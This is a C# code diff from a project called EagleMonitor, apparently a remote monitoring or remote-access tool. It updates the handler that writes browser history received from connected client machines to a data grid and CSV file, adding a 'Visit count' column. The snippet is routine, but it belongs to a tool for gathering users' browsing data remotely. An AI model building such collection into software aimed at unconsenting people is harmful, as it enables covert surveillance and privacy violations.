@@ -1,7 +1,6 @@
 ﻿using EagleMonitor.Networking;
 using EagleMonitor.Utils;
 using PacketLib.Packet;
-using System;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -36,21 +35,18 @@ namespace EagleMonitor.PacketParser
                                 row.Cells["Column2"].Value = str[1].ToString();
                                 row.Cells["Column3"].Value = str[2].ToString();
                                 row.Cells["Column4"].Value = str[3].ToString();
+                                row.Cells["Column5"].Value = str[4].ToString();
                             }
                             Miscellaneous.ToCSV(clientHandler.historyForm.dataGridView1, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv");
                             clientHandler.historyForm.loadingCircle1.Visible = false;
-                            clientHandler.historyForm.loadingCircle1.Active = false;
-                            historyPacket = null;
+                            clientHandler.historyForm.loadingCircle1.Active = false;                           
                         }));
                     }
                     else
-                    { Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date" }); }
-                    return;
+                    { Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
                 }
                 catch
-                {
-                    Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date" });
-                }
+                { Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
             }).Start();
         }
     }
